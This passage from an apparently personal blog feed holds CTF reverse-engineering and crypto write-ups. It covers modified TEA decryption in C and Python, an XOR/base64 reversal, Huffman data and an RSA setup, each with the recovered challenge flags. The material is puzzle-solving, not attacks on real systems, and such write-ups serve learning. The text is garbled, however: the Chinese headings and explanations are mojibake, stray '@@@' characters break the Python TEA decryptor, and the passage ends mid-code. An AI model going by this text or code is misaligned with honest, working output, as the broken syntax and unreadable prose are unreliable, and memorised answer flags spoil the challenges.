class="number">0x5F797274</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> data2 = <span class="number">0x64726168</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypto</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *cipher, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0, v1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t0, t1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0x6E75316C</span>ULL * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    v0 = *cipher;</span><br><span class="line">v1 = cipher[<span class="number">1</span>];</span><br><span class="line">t0 = v0;</span><br><span class="line">t1 = v1;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]) ^ (v0 + sum) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (sum +i);</span><br><span class="line">v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]) ^ (v1 + sum) ^ (*key + <span class="number">16</span> * v1) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*cipher = v0 ^ data1;</span><br><span class="line">cipher[<span class="number">1</span>] = v1 ^ data2;</span><br><span class="line">data1 = t0;</span><br><span class="line">data2 = t1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cipher[<span class="number">8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> length, i;</span><br><span class="line">cipher[<span class="number">0</span>] = <span class="number">2603150661</span>;</span><br><span class="line">cipher[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">cipher[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">cipher[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">cipher[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">cipher[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">cipher[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">cipher[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">length = <span class="keyword">sizeof</span>(cipher);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *in = (<span class="type">unsigned</span> <span class="type">int</span> *)cipher;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *out = (<span class="type">unsigned</span> <span class="type">char</span> *)cipher;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    decrypto(in + i, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, out[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;133bffe401d223a02385d90c5f1ca377&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240430002632073.png" alt="image-20240430002632073"></p><h2 id="12-whatâ€™s-this"><a href="#12-whatâ€™s-this" class="headerlink" title="12.whatâ€™s this"></a>12.<strong>whatâ€™s this</strong></h2><h5 id="LuaåŠ å¯†ï¼Ÿ"><a href="#LuaåŠ å¯†ï¼Ÿ" class="headerlink" title="LuaåŠ å¯†ï¼Ÿ"></a>LuaåŠ å¯†ï¼Ÿ</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240430010432485.png" alt="image-20240430010432485"></p><p>ä½¿ç”¨XORå‡½æ•°å°†å­—ç¬¦ä¸æ•°å­—8è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå†åŠ ä¸Š3ï¼Œbase64åŠ å¯†ï¼Œå†è¿›è¡Œå­—ç¬¦æ›¿æ¢</p><p>ç›´æ¥é€†å‘é€»è¾‘ï¼Œexpï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">new_cipher = cipher[::-<span class="number">1</span>]</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>)</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">tmp1 = num1</span><br><span class="line">tmp2 = num2</span><br><span class="line">str_result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> tmp1 != <span class="number">0</span> <span class="keyword">or</span> tmp2 != <span class="number">0</span>:</span><br><span class="line">s1 = tmp1 % <span class="number">2</span></span><br><span class="line">s2 = tmp2 % <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> s1 == s2:</span><br><span class="line">str_result = <span class="string">&quot;0&quot;</span> + str_result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">str_result = <span class="string">&quot;1&quot;</span> + str_result</span><br><span class="line">tmp1 = tmp1 // <span class="number">2</span></span><br><span class="line">tmp2 = tmp2 // <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(str_result, <span class="number">2</span>)</span><br><span class="line">d_cipher = base64.b64decode(new_cipher)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> d_cipher:</span><br><span class="line">flag += <span class="built_in">chr</span>(Xor(char - <span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="13-é¦’å¤´"><a href="#13-é¦’å¤´" class="headerlink" title="13.é¦’å¤´"></a>13.é¦’å¤´</h2><h5 id="å“ˆå¤«æ›¼ç¼–ç "><a href="#å“ˆå¤«æ›¼ç¼–ç " class="headerlink" title="å“ˆå¤«æ›¼ç¼–ç "></a>å“ˆå¤«æ›¼ç¼–ç </h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x000008DE</span>, <span class="number">0x00000395</span>, <span class="number">0x000001BE</span>, <span class="number">0x000000D9</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000033</span>,</span><br><span class="line"><span class="number">0x00000014</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000011</span>,</span><br><span class="line"><span class="number">0x000000E5</span>, <span class="number">0x00000072</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000B</span>, <span class="number">0x000001D7</span>, <span class="number">0x000000E9</span>,</span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000D</span>,</span><br><span class="line"><span class="number">0x000000EE</span>, <span class="number">0x00000076</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000007</span>, <span class="number">0x00000549</span>, <span class="number">0x0000022D</span>,</span><br><span class="line"><span class="number">0x000000F8</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000006</span>,</span><br><span class="line"><span class="number">0x00000018</span>, <span class="number">0x00000135</span>, <span class="number">0x00000089</span>, <span class="number">0x00000043</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>,</span><br><span class="line"><span class="number">0x000000AC</span>, <span class="number">0x00000054</span>, <span class="number">0x00000004</span>,</span><br><span class="line"><span class="number">0x00000001</span>, <span class="number">0x0000031C</span>, <span class="number">0x0000017F</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000059</span>, <span class="number">0x00000002</span>,</span><br><span class="line"><span class="number">0x00000008</span>, <span class="number">0x000000C5</span>, <span class="number">0x00000061</span>,</span><br><span class="line"><span class="number">0x00000030</span>, <span class="number">0x00000017</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000015</span>, <span class="number">0x0000019D</span>, <span class="number">0x000000CB</span>,</span><br><span class="line"><span class="number">0x00000065</span>, <span class="number">0x00000016</span>, <span class="number">0x00000009</span>,</span><br><span class="line"><span class="number">0x000000D2</span>, <span class="number">0x00000068</span>, <span class="number">0x00000013</span>, <span class="number">0x00000012</span>]</span><br><span class="line">num = []</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">num.append(data[i])</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[2270, 917, 446, 217, 106, 51, 20, 15, 17, 229, 114, 16, 11, 471, 233, 116, 14,</span></span><br><span class="line"><span class="number">13</span>, <span class="number">238</span>, <span class="number">118</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1353</span>, <span class="number">557</span>, <span class="number">248</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">309</span>, <span class="number">137</span>, <span class="number">67</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">172</span>, <span class="number">84</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">796</span>, <span class="number">383</span>, <span class="number">186</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">197</span>, <span class="number">97</span>, <span class="number">48</span>, <span class="number">23</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">413</span>, <span class="number">203</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">210</span>,</span><br><span class="line"><span class="number">104</span>, <span class="number">19</span>, <span class="number">18</span>]</span><br></pre></td></tr></table></figure><h2 id="15-èˆ”ç‹—å››éƒ¨æ›²â€”è®°å¿†çš„æ—¶å…‰æœº"><a href="#15-èˆ”ç‹—å››éƒ¨æ›²â€”è®°å¿†çš„æ—¶å…‰æœº" class="headerlink" title="15.èˆ”ç‹—å››éƒ¨æ›²â€”è®°å¿†çš„æ—¶å…‰æœº"></a>15.èˆ”ç‹—å››éƒ¨æ›²â€”è®°å¿†çš„æ—¶å…‰æœº</h2><h5 id="linuxåŠ¨æ€è°ƒè¯•-çœ‹æ±‡ç¼–ï¼ˆqwq"><a href="#linuxåŠ¨æ€è°ƒè¯•-çœ‹æ±‡ç¼–ï¼ˆqwq" class="headerlink" title="linuxåŠ¨æ€è°ƒè¯•  çœ‹æ±‡ç¼–ï¼ˆqwq"></a>linuxåŠ¨æ€è°ƒè¯•  çœ‹æ±‡ç¼–ï¼ˆqwq</h5><h2 id="16-èˆ”ç‹—å››éƒ¨æ›²â€”ç®€çˆ±"><a href="#16-èˆ”ç‹—å››éƒ¨æ›²â€”ç®€çˆ±" class="headerlink" title="16.èˆ”ç‹—å››éƒ¨æ›²â€”ç®€çˆ±"></a>16.èˆ”ç‹—å››éƒ¨æ›²â€”ç®€çˆ±</h2><h5 id="oç¼–è¯‘"><a href="#oç¼–è¯‘" class="headerlink" title=".oç¼–è¯‘ ?"></a>.oç¼–è¯‘ ?</h5><h2 id="17-èˆ”ç‹—å››éƒ¨æ›²â€”ç›¸é€¢å·²æ˜¯ä¸Šä¸Šç­¾"><a href="#17-èˆ”ç‹—å››éƒ¨æ›²â€”ç›¸é€¢å·²æ˜¯ä¸Šä¸Šç­¾" class="headerlink" title="17.èˆ”ç‹—å››éƒ¨æ›²â€”ç›¸é€¢å·²æ˜¯ä¸Šä¸Šç­¾"></a>17.èˆ”ç‹—å››éƒ¨æ›²â€”ç›¸é€¢å·²æ˜¯ä¸Šä¸Šç­¾</h2><h5 id="ä¿®å¤æŸåçš„DOSæ–‡ä»¶-é­”æ”¹keyçš„xxtea"><a href="#ä¿®å¤æŸåçš„DOSæ–‡ä»¶-é­”æ”¹keyçš„xxtea" class="headerlink" title="ä¿®å¤æŸåçš„DOSæ–‡ä»¶  é­”æ”¹keyçš„xxtea"></a>ä¿®å¤æŸåçš„DOSæ–‡ä»¶  é­”æ”¹keyçš„xxtea</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240501003325519.png" alt="image-20240501003325519"></p><h2 id="18-èˆ”ç‹—å››éƒ¨æ›²â€”æˆ‘çš„ç™½æœˆå…‰"><a href="#18-èˆ”ç‹—å››éƒ¨æ›²â€”æˆ‘çš„ç™½æœˆå…‰" class="headerlink" title="18.èˆ”ç‹—å››éƒ¨æ›²â€”æˆ‘çš„ç™½æœˆå…‰"></a>18.èˆ”ç‹—å››éƒ¨æ›²â€”æˆ‘çš„ç™½æœˆå…‰</h2><h5 id="ä»€ä¹ˆç—…æ¯’ï¼Ÿ"><a href="#ä»€ä¹ˆç—…æ¯’ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆç—…æ¯’ï¼Ÿ"></a>ä»€ä¹ˆç—…æ¯’ï¼Ÿ</h5><h2 id="19-ez-enc"><a href="#19-ez-enc" class="headerlink" title="19.ez_enc"></a>19.ez_enc</h2><p>z3</p><h2 id="20-easy-lauguage"><a href="#20-easy-lauguage" class="headerlink" title="20.easy lauguage"></a>20.easy lauguage</h2><p>base64+AES</p><p>æ²¡æ¢è¡¨</p><h2 id="21-é’©å­"><a href="#21-é’©å­" class="headerlink" title="21.é’©å­"></a>21.é’©å­</h2><h5 id="åè°ƒè¯•-hook-rc4"><a href="#åè°ƒè¯•-hook-rc4" class="headerlink" title="åè°ƒè¯• hook rc4"></a>åè°ƒè¯• hook rc4</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Reç™¾é¢˜è®¡åˆ’ï¼ˆ&quot;&gt;&lt;a href=&quot;#Reç™¾é¢˜è®¡åˆ’ï¼ˆ&quot; class=&quot;headerlink&quot; title=&quot;Reç™¾é¢˜è®¡åˆ’ï¼ˆ&quot;&gt;&lt;/a&gt;Reç™¾é¢˜è®¡åˆ’ï¼ˆ&lt;/h1&gt;&lt;h2 id=&quot;1-ä½ æ˜¯çœŸçš„å¤§å­¦ç”Ÿå—ï¼Ÿ&quot;&gt;&lt;a href=&quot;#1-ä½ æ˜¯çœŸçš„å¤§å­¦ç”Ÿå—ï¼Ÿ&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="é€†å‘" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/04/16/NSSCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/04/16/NSSCTF/</id>
    <published>2024-04-15T16:00:00.000Z</published>
    <updated>2024-09-16T07:16:24.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h3 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-ç®€ç®€å•å•çš„é€»è¾‘"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-ç®€ç®€å•å•çš„é€»è¾‘" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]ç®€ç®€å•å•çš„é€»è¾‘"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]ç®€ç®€å•å•çš„é€»è¾‘</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    result = result + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(flag[i])^key))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv23598163/">SWPUCTF 2021 æ–°ç”Ÿèµ›]ç®€ç®€å•å•çš„é€»è¾‘ - å“”å“©å“”å“© (bilibili.com)</a></p><blockquote><p>é¦–å…ˆè¦æŒæ¡çš„çŸ¥è¯†ç‚¹ï¼š</p><p>å­—ç¬¦ä¸²è½¬ASCII </p><p>print(ord(â€˜aâ€™))   #97</p><p>ASCIIè½¬å­—ç¬¦ä¸²</p><p>print(chr(97))  #a</p><p>åˆ‡ç‰‡:<a href="https://www.jianshu.com/p/15715d6f4dad">https://www.jianshu.com/p/15715d6f4dad</a></p><p>åè¿›åˆ¶è½¬åå…­è¿›åˆ¶</p><p>print(hex(10)) #a</p><p>åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</p><p>print(int(â€˜aâ€™,16))  #10</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>((result[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]),<span class="number">16</span>)^key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br><span class="line"><span class="comment"># flag = NSSCTF&#123;EZEZ_RERE&#125;</span></span><br></pre></td></tr></table></figure><h3 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-re1"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-re1" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]re1"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]re1</h3><p>å°±æ˜¯ï¼Œå˜ä¸€ä¸‹ï¼Œ3â€“e  4â€“a</p><p>NSSCTF{easy_reverse}</p><h3 id="HGAME-2023-week1-a-cup-of-tea"><a href="#HGAME-2023-week1-a-cup-of-tea" class="headerlink" title="[HGAME 2023 week1]a_cup_of_tea"></a>[HGAME 2023 week1]a_cup_of_tea</h3><p>45678901345678902345678912345678</p><p>æ”¾ä¸ªTEAå°è½®å­ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span> @@@</span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="å°è½®å­RSA"><a href="#å°è½®å­RSA" class="headerlink" title="å°è½®å­RSA"></a>å°è½®å­RSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span 